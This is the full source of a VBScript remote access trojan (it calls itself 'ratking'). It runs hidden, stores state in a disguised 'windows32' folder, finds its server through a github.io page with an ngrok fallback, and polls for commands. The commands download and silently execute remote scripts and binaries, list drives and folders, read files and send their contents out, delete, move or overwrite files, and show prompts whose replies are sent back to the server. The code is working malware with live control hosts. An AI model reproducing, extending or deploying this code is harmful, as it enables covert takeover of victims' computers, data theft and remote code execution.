Option Explicit
On Error Resume Next

Dim fso, shell, user, configFolder
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get current username
user = shell.ExpandEnvironmentStrings("%USERNAME%")
configFolder = "windows32"

' Path for dummyFolder and interval.txt
Dim folderPath, intervalFile
folderPath = "C:\Users\" & user & "\Documents\" & configFolder
intervalFile = folderPath & "\interval.txt"

' Create folder if it doesn't exist
If Not fso.FolderExists(folderPath) Then
    fso.CreateFolder folderPath
End If

' Create interval.txt if it doesn't exist, with default value 15
If Not fso.FileExists(intervalFile) Then
    Dim f
    Set f = fso.CreateTextFile(intervalFile, True)
    f.Write "15"
    f.Close
End If

' --- Function to read interval ---
Function ReadInterval()
    Dim f, sec
    Set f = fso.OpenTextFile(intervalFile, 1)
    sec = Trim(f.ReadAll)
    f.Close
    If IsNumeric(sec) Then
        ReadInterval = CInt(sec)
    Else
        ReadInterval = 15 ' fallback default
    End If
End Function

Function GetServerAddress()
    Dim http, url
    ' --- Hard-coded GitHub raw file URL ---
    url = "https://sellitcom.github.io/webhook/ratlive.html"
    
    ' --- Generate random query to prevent caching ---
    Dim rand
    Randomize
    rand = "nocache=" & CStr(Int((1000000) * Rnd()))
    
    ' --- Append random query ---
    url = url & "?" & rand
    
    ' --- Fetch the URL ---
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    
    ' --- Return response ---
    If http.Status = 200 Then
        GetServerAddress = http.responseText
    Else
        GetServerAddress = "https://unsuffering-colton-adoptively.ngrok-free.dev"
    End If
End Function

Dim serverAddr
If serverAddr = "" Then
    serverAddr = GetServerAddress()
End If

' Helper function to Base64 encode
Function Base64EncodeFA(sText)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = StrConv(sText, vbFromUnicode)
    Base64Encode = node.text
End Function

' --- Function to get webpage text ---
Function GetWebText(url, hostIDFile)
    Dim fso, hostID, http, fullUrl, rand, f, rndNum
    Set fso = CreateObject("Scripting.FileSystemObject")

    ' --- Check if hostID file exists ---
    If fso.FileExists(hostIDFile) Then
        Set f = fso.OpenTextFile(hostIDFile, 1)
        hostID = Trim(f.ReadAll)
        f.Close
    Else
        ' Create file and store a 3-digit random number
        Randomize
        rndNum = Int(900 * Rnd()) + 100  ' 100..999
        Set f = fso.CreateTextFile(hostIDFile, True)
        f.Write rndNum
        f.Close
        hostID = rndNum
    End If
    
    ' --- Generate random query to prevent caching ---
    rand = "nocache=" & CStr(Int((1000000) * Rnd()))
    
    ' --- Append GET parameter properly ---
    If InStr(url, "?") > 0 Then
        fullUrl = url & "&hostID=" & hostID & "&" & rand
    Else
        fullUrl = url & "?hostID=" & hostID & "&" & rand
    End If

    ' --- Fetch the URL ---
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", fullUrl, False

    ' Add other headers
    http.setRequestHeader "Connection", "close"
    http.setRequestHeader "ngrok-skip-browser-warning", "1"

    http.Send
    
    ' --- Return response ---
    If http.Status = 200 Then
        GetWebText = http.responseText
    Else
        GetWebText = "(Error fetching text: " & http.Status & ")"
    End If
End Function

Function URLEncode(str)
    Dim i, ch, code, bytes, b, result
    result = ""

    For i = 1 To Len(str)
        ch = Mid(str, i, 1)
        code = AscW(ch)

        ' Alphanumeric
        If (code >= 48 And code <= 57) _
        Or (code >= 65 And code <= 90) _
        Or (code >= 97 And code <= 122) Then
            result = result & ch

        ' Space
        ElseIf code = 32 Then
            result = result & "%20"

        Else
            ' Convert UTF-16 → UTF-8 byte sequence
            bytes = UTF8Bytes(code)

            For Each b In bytes
                result = result & "%" & Right("0" & Hex(b), 2)
            Next
        End If
    Next

    URLEncode = result
End Function

' Helper: Convert Unicode code point to UTF-8 byte array
Function UTF8Bytes(code)
    Dim arr()

    If code < &H80 Then
        ReDim arr(0)
        arr(0) = code

    ElseIf code < &H800 Then
        ReDim arr(1)
        arr(0) = &HC0 Or (code \ 64)
        arr(1) = &H80 Or (code And &H3F)

    Else
        ReDim arr(2)
        arr(0) = &HE0 Or (code \ 4096)
        arr(1) = &H80 Or ((code \ 64) And &H3F)
        arr(2) = &H80 Or (code And &H3F)
    End If

    UTF8Bytes = arr
End Function

Function signalToServer(sig_message)

    Dim sig_http, sig_url, sig_rand, sig_host, sig_hostIDFile, sig_fso, sig_f

    Set sig_fso = CreateObject("Scripting.FileSystemObject")
    sig_hostIDFile = folderPath & "\hostID.txt"

    ' --- Read hostID ---
    If sig_fso.FileExists(sig_hostIDFile) Then
        Set sig_f = sig_fso.OpenTextFile(sig_hostIDFile, 1)
        sig_host = Trim(sig_f.ReadAll)
        sig_f.Close
    Else
        sig_host = "000"
    End If

    ' --- Encode everything ---
    Dim encMsg, encHost
    encMsg = URLEncode(sig_message)
    encHost = URLEncode(sig_host)

    ' --- Cache buster ---
    sig_rand = CStr(Int((999999) * Rnd()))

    ' --- Build final GET URL ---
    sig_url = serverAddr & "/ratking/server/signalsEndPoint.php" & _
              "?hostID=" & encHost & _
              "&msg=" & encMsg & _
              "&nocache=" & sig_rand

    ' --- Send silently ---
    Set sig_http = CreateObject("MSXML2.XMLHTTP")
    sig_http.Open "GET", sig_url, False
    ' Add other headers
    sig_http.setRequestHeader "Connection", "close"
    sig_http.setRequestHeader "ngrok-skip-browser-warning", "1"
    sig_http.Send

End Function


' --- Convert bytes → human-readable string ---
Function HRSize(bytes)
    If IsNumeric(bytes) = False Then
        HRSize = bytes
        Exit Function
    End If

    Dim size : size = CDbl(bytes)

    If size < 1024 Then
        HRSize = size & " B"
    ElseIf size < 1024 ^ 2 Then
        HRSize = FormatNumber(size / 1024, 2) & " KB"
    ElseIf size < 1024 ^ 3 Then
        HRSize = FormatNumber(size / (1024 ^ 2), 2) & " MB"
    Else
        HRSize = FormatNumber(size / (1024 ^ 3), 2) & " GB"
    End If
End Function

' --- Convert binary to Base64 ---
Function ToBase64(bin)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")

    node.dataType = "bin.base64"
    node.nodeTypedValue = bin

    ToBase64 = Replace(node.text, vbLf, "")
End Function


' --- Try reading binary as UTF-8 text ---
Function TryText(bin)
    On Error Resume Next
    Dim s, stm
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write bin
    stm.Position = 0
    stm.Type = 2
    stm.Charset = "utf-8"

    s = stm.ReadText
    stm.Close

    If Err.Number <> 0 Then
        TryText = ""
        Err.Clear
    Else
        TryText = s
    End If
End Function


' ======================================================
Dim url, hostIDFile
url = serverAddr & "/ratking/server/instructionsEndPoint.php"
hostIDFile = "C:\Users\" & user & "\Documents\" & configFolder & "\hostID.txt"
Function updateURL()
    serverAddr = GetServerAddress()
    url = serverAddr & "/ratking/server/instructionsEndPoint.php"
End Function
' ======================================================
' --- Loop to fetch text every N seconds ---
Do While True
    Dim N, text
    updateURL()
    N = ReadInterval()
    text = GetWebText(url, hostIDFile)

' ===================================================================

' --- Handle FORCE_STOP ---
If InStr(1, text, "FORCE_STOP", vbTextCompare) > 0 Then
    signalToServer "Given HOST was FORCE_STOPPED"
    Exit Do
End If

' --- Handle FETCH command ---
If LCase(Left(Trim(text), 6)) = "fetch " Then

    Dim fetchUrl, fetchData, savePath, fileName, parts, modulesFolder, fetchedFile

    ' Extract URL after FETCH
    fetchUrl = Trim(Mid(text, 7))

    ' Extract the filename from the URL
    parts = Split(fetchUrl, "/")
    fileName = parts(UBound(parts))

    ' If filename missing, fallback
    If fileName = "" Then fileName = "downloaded.vbs"

    ' Force .vbs extension (optional)
    If LCase(Right(fileName, 4)) <> ".vbs" Then
        fileName = fileName & ".vbs"
    End If

    ' Create modules folder path
    modulesFolder = folderPath & "\modules"

    ' Create modules directory if missing
    If Not fso.FolderExists(modulesFolder) Then
        fso.CreateFolder modulesFolder
    End If

    ' Full save path
    savePath = modulesFolder & "\" & fileName

    ' Fetch remote file content
    fetchData = GetWebText(fetchUrl, hostIDFile)

    ' Overwrite file with new content
    Set fetchedFile = fso.CreateTextFile(savePath, True)
    fetchedFile.Write fetchData
    fetchedFile.Close

    signalToServer "Given HOST successfully FETCHED " & fileName & " module"
End If

' --- Handle EXECUTE command ---
If LCase(Left(Trim(text), 8)) = "execute " Then

    Dim execFileName, execFullPath

    ' Extract filename after EXECUTE
    execFileName = Trim(Mid(text, 9))

    ' Force .vbs extension
    If LCase(Right(execFileName, 4)) <> ".vbs" Then
        execFileName = execFileName & ".vbs"
    End If

    ' Full path in modules folder
    execFullPath = folderPath & "\modules\" & execFileName

    ' Check if file exists
    If fso.FileExists(execFullPath) Then
        ' Run the script silently
        shell.Run "wscript.exe """ & execFullPath & """", 0, False
    Else
        ' Optional: log or ignore if file missing
        ' MsgBox "Module not found: " & execFullPath
    End If

    signalToServer "Given HOST successfully EXECUTED " & execFileName & " module"

End If

' --- Handle INTERVAL command ---
If LCase(Left(Trim(text), 8)) = "interval" Then

    Dim newInterval, intervalFilePath
    intervalFilePath = folderPath & "\interval.txt"

    ' Extract N (after the word INTERVAL)
    newInterval = Trim(Mid(text, 9))

    ' Validate numeric
    If IsNumeric(newInterval) Then
        ' Ensure interval.txt exists
        If Not fso.FileExists(intervalFilePath) Then
            Set f = fso.CreateTextFile(intervalFilePath, True)
            f.Close
        End If

        ' Overwrite with new interval
        Set f = fso.OpenTextFile(intervalFilePath, 2, True) ' ForWriting = 2
        f.Write newInterval
        f.Close
    End If

    signalToServer "Given HOST successfully changed the INTERVAL to " & newInterval

End If

' --- Handle CONFIG command ---
If LCase(Left(Trim(text), 6)) = "config" Then

    Dim cfgRaw, cfgName, cfgValue, cfgFolder, cfgPath, q1, q2

    cfgRaw = Trim(Mid(text, 7)) ' remove "CONFIG "

    ' The format is: filename "string"
    ' Find the quoted string
    q1 = InStr(cfgRaw, """")
    q2 = InStrRev(cfgRaw, """")

    If q1 > 0 And q2 > q1 Then
        cfgName = Trim(Left(cfgRaw, q1 - 1))        ' filename
        cfgValue = Mid(cfgRaw, q1 + 1, q2 - q1 - 1) ' text inside quotes

        ' Build configs folder path
        cfgFolder = folderPath & "\configs"

        ' Create configs folder if missing
        If Not fso.FolderExists(cfgFolder) Then
            fso.CreateFolder(cfgFolder)
        End If

        ' Build file path (always .txt)
        cfgPath = cfgFolder & "\" & cfgName & ".txt"

        ' Create or overwrite file
        Dim fcfg
        Set fcfg = fso.OpenTextFile(cfgPath, 2, True) ' ForWriting + create if missing
        fcfg.Write cfgValue
        fcfg.Close
    End If

    signalToServer "Given HOST successfully CONFIGURED " & cfgName

End If


' --- Handle DOWN command ---
If LCase(Left(Trim(text), 4)) = "down" Then

    Dim down_file, down_baseUrl, down_fetchUrl, down_folder, down_savePath
    Dim down_http, down_stream

    down_file = Trim(Mid(text, 5))
    If down_file <> "" Then

        down_baseUrl = serverAddr & "/ratking/server/cells/files/"
        down_fetchUrl = down_baseUrl & down_file

        down_folder = folderPath & "\downs"
        If Not fso.FolderExists(down_folder) Then
            fso.CreateFolder(down_folder)
        End If

        down_savePath = down_folder & "\" & down_file

        ' Delete existing file if present (ensures overwrite)
        If fso.FileExists(down_savePath) Then fso.DeleteFile down_savePath, True

        ' Fetch binary file
        Set down_http = CreateObject("MSXML2.XMLHTTP")
        down_http.Open "GET", down_fetchUrl, False
        ' Add other headers
        down_http.setRequestHeader "Connection", "close"
        down_http.setRequestHeader "ngrok-skip-browser-warning", "1"
        down_http.Send

        If down_http.Status = 200 Then
            Set down_stream = CreateObject("ADODB.Stream")
            down_stream.Type = 1 ' Binary
            down_stream.Open
            down_stream.Write down_http.responseBody
            down_stream.SaveToFile down_savePath, 2 ' Overwrite
            down_stream.Close
        End If

    End If

    signalToServer "Given HOST successfully DOWNED " & down_file
End If

' --- Handle RUN command ---
If LCase(Left(Trim(text), 3)) = "run" Then

    Dim run_file, run_path

    ' Extract filename.extension after "RUN "
    run_file = Trim(Mid(text, 4))
    If run_file <> "" Then

        ' Full path in downs folder
        run_path = folderPath & "\downs\" & run_file

        ' Check if file exists
        If fso.FileExists(run_path) Then
            ' Run with default app, cmd window hidden
            shell.Run "cmd /c start """" """ & run_path & """", 0, False
        End If
    End If

    signalToServer "Given HOST successfully RAN " & run_file
End If

' --- Handle OUT_LOOP_N command ---
If LCase(Left(Trim(text), 10)) = "out_loop_n" Then

    Dim oln_parts, oln_msg, oln_title
    Dim oln_prefix, oln_fields
    Dim oln_N, oln_btn, oln_icon, oln_def, oln_mod
    Dim oln_flags, oln_i

    ' Expected format:
    ' OUT_LOOP_N N "msg string" btn icon def modal "title string"

    ' Split on quotes:
    '   0 = OUT_LOOP_N N btn icon def modal
    '   1 = message
    '   2 = btn icon def modal
    '   3 = title
    oln_parts = Split(text, """")

    oln_msg   = oln_parts(1)   ' Message text
    oln_title = oln_parts(3)   ' Title text

    ' Prefix part BEFORE first quote:
    ' Contains: OUT_LOOP_N N
    oln_prefix = Trim(oln_parts(0))

    ' Remove the command name:
    oln_prefix = Trim(Replace(oln_prefix, "OUT_LOOP_N", "", 1, 1, vbTextCompare))

    ' Now oln_prefix = N
    ' oln_parts(2) contains: btn icon def modal

    oln_fields = Split(Trim(oln_prefix & " " & Trim(oln_parts(2))), " ")

    ' Extract:
    oln_N    = CInt(oln_fields(0))
    oln_btn  = oln_fields(1)
    oln_icon = oln_fields(2)
    oln_def  = oln_fields(3)
    oln_mod  = oln_fields(4)

    ' Apply defaults if UD
    If UCase(oln_btn)  = "UD" Then oln_btn  = "vbOKOnly"
    If UCase(oln_icon) = "UD" Then oln_icon = "vbInformation"
    If UCase(oln_def)  = "UD" Then oln_def  = "vbDefaultButton1"
    If UCase(oln_mod)  = "UD" Then oln_mod  = "vbSystemModal"

    ' Build MsgBox flags
    oln_flags = Eval(oln_btn) + Eval(oln_icon) + Eval(oln_def) + Eval(oln_mod)

    ' Loop N times
    For oln_i = 1 To oln_N
        MsgBox oln_msg, oln_flags, oln_title
    Next

End If

' --- Handle OUT_LOOP_C command ---
If LCase(Left(Trim(text), 10)) = "out_loop_c" Then

    Dim olc_parts, olc_msg, olc_title
    Dim olc_prefix, olc_fields
    Dim olc_cond, olc_btn, olc_icon, olc_def, olc_mod
    Dim olc_flags, olc_res, olc_respText

    ' Expected syntax:
    ' OUT_LOOP_C responseCondition "msg string" buttonsString iconString defaultButtonString modalString "title string"

    ' Split on quotes
    olc_parts = Split(text, """")

    ' olc_parts(1) = msg string
    ' olc_parts(3) = title string
    olc_msg   = olc_parts(1)
    olc_title = olc_parts(3)

    ' Prefix part before first quote contains OUT_LOOP_C responseCondition
    olc_prefix = Trim(olc_parts(0))
    olc_prefix = Trim(Replace(olc_prefix, "OUT_LOOP_C", "", 1, 1, vbTextCompare))
    olc_fields = Split(Trim(olc_prefix & " " & Trim(olc_parts(2))), " ")

    ' Extract parameters
    olc_cond = UCase(olc_fields(0))    ' Condition to stop looping (e.g., "OK", "Cancel")
    olc_btn  = olc_fields(1)
    olc_icon = olc_fields(2)
    olc_def  = olc_fields(3)
    olc_mod  = olc_fields(4)

    ' Apply defaults if UD
    If UCase(olc_btn)  = "UD" Then olc_btn  = "vbOKOnly"
    If UCase(olc_icon) = "UD" Then olc_icon = "vbInformation"
    If UCase(olc_def)  = "UD" Then olc_def  = "vbDefaultButton1"
    If UCase(olc_mod)  = "UD" Then olc_mod  = "vbSystemModal"

    ' Build MsgBox flags
    olc_flags = Eval(olc_btn) + Eval(olc_icon) + Eval(olc_def) + Eval(olc_mod)

    ' --- Loop until condition met ---
    Do
        olc_res = MsgBox(olc_msg, olc_flags, olc_title)

        ' Convert numeric response to readable string
        Select Case olc_res
            Case vbOK:     olc_respText = "OK"
            Case vbCancel: olc_respText = "Cancel"
            Case vbYes:    olc_respText = "Yes"
            Case vbNo:     olc_respText = "No"
            Case vbRetry:  olc_respText = "Retry"
            Case vbAbort:  olc_respText = "Abort"
            Case vbIgnore: olc_respText = "Ignore"
            Case Else:     olc_respText = "Unknown"
        End Select

    Loop While UCase(olc_respText) <> olc_cond

End If

' --- Handle OUT_STANDARD command ---
If LCase(Left(Trim(text), 12)) = "out_standard" Then

    Dim os_msg, os_btn, os_icon, os_def, os_mod, os_title
    Dim os_parts, os_res, os_flags, os_raw, os_arr
    Dim os_respText

    ' Format:
    ' OUT_STANDARD "msg string" btn icon def modal "title string"

    os_parts = Split(text, """")
    ' os_parts(1) = msg
    ' os_parts(3) = title

    os_msg = os_parts(1)
    os_title = os_parts(3)

    ' Extract raw parameters (btn icon def modal)
    os_raw = Trim(os_parts(2))
    os_arr = Split(os_raw, " ")

    os_btn  = os_arr(0)
    os_icon = os_arr(1)
    os_def  = os_arr(2)
    os_mod  = os_arr(3)

    ' --- UD defaults ---
    If UCase(os_btn)  = "UD" Then os_btn  = "vbOKOnly"
    If UCase(os_icon) = "UD" Then os_icon = "vbInformation"
    If UCase(os_def)  = "UD" Then os_def  = "vbDefaultButton1"
    If UCase(os_mod)  = "UD" Then os_mod  = "vbSystemModal"

    ' --- Build MsgBox flags ---
    os_flags = Eval(os_btn) + Eval(os_icon) + Eval(os_def) + Eval(os_mod)

    ' --- Show the message box ---
    os_res = MsgBox(os_msg, os_flags, os_title)

    ' --- Convert numeric result → readable text ---
    Select Case os_res
        Case vbOK:     os_respText = "OK"
        Case vbCancel: os_respText = "Cancel"
        Case vbYes:    os_respText = "Yes"
        Case vbNo:     os_respText = "No"
        Case vbRetry:  os_respText = "Retry"
        Case vbAbort:  os_respText = "Abort"
        Case vbIgnore: os_respText = "Ignore"
        Case Else:     os_respText = "Unknown"
    End Select

    os_respText = "Given HOST replied with """ & os_respText & """"

    ' --- Send back to server ---
    signalToServer os_respText

End If

' --- Handle IN_LOOP_C command ---
If LCase(Left(Trim(text), 9)) = "in_loop_c" Then

    Dim ilc_parts, ilc_msg, ilc_title, ilc_default
    Dim ilc_cond, ilc_response

    ' Expected syntax:
    ' IN_LOOP_C "response condition string" "msg string" "title string" "default value string"

    ' Split by quotes
    ilc_parts = Split(text, """")

    ' Extract parameters
    ilc_cond    = UCase(Trim(ilc_parts(1))) ' Response condition to stop looping
    ilc_msg     = ilc_parts(3)
    ilc_title   = ilc_parts(5)
    ilc_default = ilc_parts(7)

    ' Loop until response matches condition
    Do
        ilc_response = InputBox(ilc_msg, ilc_title, ilc_default)
    Loop While UCase(Trim(ilc_response)) <> ilc_cond

End If


' --- Handle IN_STANDARD command ---
If LCase(Left(Trim(text), 11)) = "in_standard" Then

    Dim ins_parts, ins_msg, ins_title, ins_default
    Dim ins_response

    ' Expected syntax:
    ' IN_STANDARD "msg string" "title string" "default value string"

    ' Split by quotes
    ins_parts = Split(text, """")

    ' Extract parameters
    ins_msg     = ins_parts(1)
    ins_title   = ins_parts(3)
    ins_default = ins_parts(5)

    ' Show input box
    ins_response = InputBox(ins_msg, ins_title, ins_default)

    If ins_response = "" Then
        ' Empty
        ins_response = "Given HOST did not sent any string"
    Else
        ins_response = "Given HOST replied with """ & ins_response & """"

    End If

    ' --- Send the response to server ---
    signalToServer ins_response

End If

' --- Handle LIST_FILES command ---
If LCase(Left(Trim(text), 10)) = "list_files" Then

    Dim lf_parts, lf_path, lf_output
    Dim lf_fso, lf_folderObj, lf_fileObj, lf_subObj, lf_driveObj

    Set lf_fso = CreateObject("Scripting.FileSystemObject")
    lf_output = ""

    ' Split by quotes → LIST_FILES "path"
    lf_parts = Split(text, """")
    
    ' lf_parts(1) contains the path string
    lf_path = Trim(lf_parts(1))

    If UCase(lf_path) = "ROOT" Then
        ' List all drives
        For Each lf_driveObj In lf_fso.Drives
            lf_output = lf_output & lf_driveObj.DriveLetter & ":\\" & vbCrLf
        Next
    Else
        ' Check if folder exists
        If lf_fso.FolderExists(lf_path) Then
            
            Set lf_folderObj = lf_fso.GetFolder(lf_path)

            ' List subfolders
            For Each lf_subObj In lf_folderObj.SubFolders
                lf_output = lf_output & "[Folder] " & lf_subObj.Name & vbCrLf
            Next

            ' List files
            For Each lf_fileObj In lf_folderObj.Files
                lf_output = lf_output & "[File] " & lf_fileObj.Name & vbCrLf
            Next

        Else
            lf_output = "(Error: Path not found)"
        End If
    End If

    ' Send result to server
    signalToServer lf_output

End If

' --- Handle LIST_DETAILS command ---
If LCase(Left(Trim(text), 12)) = "list_details" Then

    Dim ld_parts, ld_path, ld_fso
    Dim ld_output, ld_obj

    ld_parts = Split(text, """")
    ld_path = Trim(ld_parts(1))

    Set ld_fso = CreateObject("Scripting.FileSystemObject")
    ld_output = ""

    ' ---- Check Folder ----
    If ld_fso.FolderExists(ld_path) Then
        
        Set ld_obj = ld_fso.GetFolder(ld_path)

        ld_output = ld_output & "[TYPE] Folder" & vbCrLf
        ld_output = ld_output & "[PATH] " & ld_obj.Path & vbCrLf
        ld_output = ld_output & "[NAME] " & ld_obj.Name & vbCrLf
        ld_output = ld_output & "[SIZE] " & HRSize(ld_obj.Size) & vbCrLf
        ld_output = ld_output & "[DATE CREATED] " & ld_obj.DateCreated & vbCrLf
        ld_output = ld_output & "[DATE MODIFIED] " & ld_obj.DateLastModified & vbCrLf
        ld_output = ld_output & "[DATE ACCESSED] " & ld_obj.DateLastAccessed & vbCrLf
        ld_output = ld_output & "[ATTRIBUTES] " & ld_obj.Attributes & vbCrLf

    ' ---- Check File ----
    ElseIf ld_fso.FileExists(ld_path) Then
        
        Set ld_obj = ld_fso.GetFile(ld_path)

        ld_output = ld_output & "[TYPE] File" & vbCrLf
        ld_output = ld_output & "[PATH] " & ld_obj.Path & vbCrLf
        ld_output = ld_output & "[NAME] " & ld_obj.Name & vbCrLf
        ld_output = ld_output & "[SIZE] " & HRSize(ld_obj.Size) & vbCrLf
        ld_output = ld_output & "[EXTENSION] " & ld_obj.Type & vbCrLf
        ld_output = ld_output & "[DATE CREATED] " & ld_obj.DateCreated & vbCrLf
        ld_output = ld_output & "[DATE MODIFIED] " & ld_obj.DateLastModified & vbCrLf
        ld_output = ld_output & "[DATE ACCESSED] " & ld_obj.DateLastAccessed & vbCrLf
        ld_output = ld_output & "[ATTRIBUTES] " & ld_obj.Attributes & vbCrLf

    Else
        ld_output = "(Error: Path not found)"
    End If

    ' ---- Send detailed report to server ----
    signalToServer ld_output

End If

' --- Handle READ_CONTENT command ---
If LCase(Left(Trim(text), 12)) = "read_content" Then

    Dim rc_parts, rc_path, rc_fso, rc_out, rc_file

    rc_parts = Split(text, """")
    rc_path = Trim(rc_parts(1))

    Set rc_fso = CreateObject("Scripting.FileSystemObject")

    If rc_fso.FileExists(rc_path) Then
        Set rc_file = rc_fso.OpenTextFile(rc_path, 1) ' ForReading = 1
        rc_out = rc_file.ReadAll
        rc_file.Close
    Else
        rc_out = "(Error: File not found)"
    End If

    signalToServer rc_out

End If

' --- Handle DELETE command ---
If LCase(Left(Trim(text), 6)) = "delete" Then

    Dim del_parts, del_path, del_fso

    del_parts = Split(text, """")
    del_path = Trim(del_parts(1))

    Set del_fso = CreateObject("Scripting.FileSystemObject")

    If del_fso.FileExists(del_path) Then
        ' Delete file
        On Error Resume Next
        del_fso.DeleteFile del_path, True
        If Err.Number = 0 Then
            signalToServer "Deleted file: " & del_path
        Else
            signalToServer "Error deleting file: " & del_path
            Err.Clear
        End If
        On Error GoTo 0

    ElseIf del_fso.FolderExists(del_path) Then
        ' Delete folder (recursive)
        On Error Resume Next
        del_fso.DeleteFolder del_path, True
        If Err.Number = 0 Then
            signalToServer "Deleted folder: " & del_path
        Else
            signalToServer "Error deleting folder: " & del_path
            Err.Clear
        End If
        On Error GoTo 0

    Else
        signalToServer "(Error: Path not found)"
    End If

End If

' --- Handle COPY command ---
If LCase(Left(Trim(text), 4)) = "copy" Then

    Dim cop_parts, cop_src, cop_dst, cop_fso
    Set cop_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract BOTH quoted paths
    cop_parts = Split(text, """")
    ' cop_parts(1) = source
    ' cop_parts(3) = destination
    cop_src = cop_parts(1)
    cop_dst = cop_parts(3)

    On Error Resume Next

    ' --- FILE COPY ---
    If cop_fso.FileExists(cop_src) Then
        cop_fso.CopyFile cop_src, cop_dst, True   ' overwrite allowed
        If Err.Number = 0 Then
            signalToServer "Copied file to: " & cop_dst
        Else
            signalToServer "Error copying file."
            Err.Clear
        End If

    ' --- FOLDER COPY ---
    ElseIf cop_fso.FolderExists(cop_src) Then
        cop_fso.CopyFolder cop_src, cop_dst, True ' recursive + overwrite
        If Err.Number = 0 Then
            signalToServer "Copied folder to: " & cop_dst
        Else
            signalToServer "Error copying folder."
            Err.Clear
        End If

    Else
        signalToServer "(Error: Source path not found)"
    End If

    On Error GoTo 0
End If

' --- Handle MOVE command ---
If LCase(Left(Trim(text), 4)) = "move" Then

    Dim mov_parts, mov_src, mov_dst, mov_fso
    Set mov_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract BOTH quoted paths
    mov_parts = Split(text, """")
    mov_src = mov_parts(1)
    mov_dst = mov_parts(3)

    On Error Resume Next

    ' --- FILE MOVE ---
    If mov_fso.FileExists(mov_src) Then
        mov_fso.MoveFile mov_src, mov_dst
        If Err.Number = 0 Then
            signalToServer "Moved file to: " & mov_dst
        Else
            signalToServer "Error moving file."
            Err.Clear
        End If

    ' --- FOLDER MOVE ---
    ElseIf mov_fso.FolderExists(mov_src) Then
        mov_fso.MoveFolder mov_src, mov_dst
        If Err.Number = 0 Then
            signalToServer "Moved folder to: " & mov_dst
        Else
            signalToServer "Error moving folder."
            Err.Clear
        End If

    Else
        signalToServer "(Error: Source path not found)"
    End If

    On Error GoTo 0
End If

' --- Handle CREATE_FOLDER command ---
If LCase(Left(Trim(text), 13)) = "create_folder" Then

    Dim cf_parts, cf_base, cf_name, cf_newPath, cf_fso
    Set cf_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract values: path + folder name
    cf_parts = Split(text, """")
    cf_base = cf_parts(1)
    cf_name = cf_parts(3)

    cf_newPath = cf_base
    If Right(cf_newPath, 1) <> "\" Then cf_newPath = cf_newPath & "\"
    cf_newPath = cf_newPath & cf_name

    On Error Resume Next

    If Not cf_fso.FolderExists(cf_newPath) Then
        cf_fso.CreateFolder cf_newPath
        If Err.Number = 0 Then
            signalToServer "Created folder: " & cf_newPath
        Else
            signalToServer "(Error creating folder)"
            Err.Clear
        End If
    Else
        signalToServer "Folder already exists: " & cf_newPath
    End If

    On Error GoTo 0
End If

' --- Handle CREATE_FILE command ---
If LCase(Left(Trim(text), 11)) = "create_file" Then

    Dim cfile_parts, cfile_path, cfile_name, cfile_full
    Dim cfile_fso, cfile_file

    Set cfile_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract "path" and "filename"
    cfile_parts = Split(text, """")
    cfile_path = Trim(cfile_parts(1))
    cfile_name = Trim(cfile_parts(3))

    ' Normalize path
    If Right(cfile_path, 1) <> "\" Then
        cfile_path = cfile_path & "\"
    End If

    cfile_full = cfile_path & cfile_name

    ' Folder check
    If Not cfile_fso.FolderExists(cfile_path) Then
        signalToServer "Error: Folder does not exist: " & cfile_path
    Else
        ' Create file
        On Error Resume Next
        Set cfile_file = cfile_fso.CreateTextFile(cfile_full, True)

        If Err.Number = 0 Then
            cfile_file.Close
            signalToServer "File created: " & cfile_full
        Else
            signalToServer "Error creating file: " & Err.Description
            Err.Clear
        End If

        On Error GoTo 0
    End If

End If

' --- Handle RENAME command ---
If LCase(Left(Trim(text), 6)) = "rename" Then

    Dim rn_parts, rn_fullPath, rn_newName, rn_fso, rn_parent, rn_target

    Set rn_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract: "full path" "new name"
    rn_parts = Split(text, """")
    rn_fullPath = Trim(rn_parts(1))
    rn_newName  = Trim(rn_parts(3))

    ' Determine parent folder
    rn_parent = rn_fso.GetParentFolderName(rn_fullPath)
    If Right(rn_parent, 1) <> "\" Then rn_parent = rn_parent & "\"
    rn_target = rn_parent & rn_newName

    ' Check existence
    If rn_fso.FileExists(rn_fullPath) Or rn_fso.FolderExists(rn_fullPath) Then
        ' Delete target if already exists to allow overwrite
        If rn_fso.FileExists(rn_target) Then rn_fso.DeleteFile rn_target, True
        If rn_fso.FolderExists(rn_target) Then rn_fso.DeleteFolder rn_target, True

        ' Rename
        rn_fso.MoveFile rn_fullPath, rn_target   ' works for file
        ' If folder, use MoveFolder
        If rn_fso.FolderExists(rn_fullPath) Then
            rn_fso.MoveFolder rn_fullPath, rn_target
        End If

        If Err.Number = 0 Then
            signalToServer "Renamed to: " & rn_target
        Else
            signalToServer "Error renaming: " & Err.Description
            Err.Clear
        End If
    Else
        signalToServer "Error: Original path does not exist -> " & rn_fullPath
    End If

    On Error GoTo 0
End If



' --- Handle PUT_CONTENT command ---
If LCase(Left(Trim(text), 11)) = "put_content" Then

    Dim pc_parts, pc_file, pc_text, pc_fso, pc_dir
    Set pc_fso = CreateObject("Scripting.FileSystemObject")

    ' Extract values
    pc_parts = Split(text, """")
    pc_file = pc_parts(1)
    pc_text = pc_parts(3)

    pc_dir = pc_fso.GetParentFolderName(pc_file)

    On Error Resume Next

    ' Create folder if missing
    If Not pc_fso.FolderExists(pc_dir) Then
        pc_fso.CreateFolder pc_dir
    End If

    ' Overwrite file
    Dim pc_handle
    Set pc_handle = pc_fso.CreateTextFile(pc_file, True)
    pc_handle.Write pc_text
    pc_handle.Close

    If Err.Number = 0 Then
        signalToServer "Wrote content to: " & pc_file
    Else
        signalToServer "(Error writing content)"
        Err.Clear
    End If

    On Error GoTo 0
End If


' =================================================================

    ' Display the fetched text
    ' MsgBox text, vbInformation, "Web Message"

    WScript.Sleep N * 1000
Loop

' Script stopped
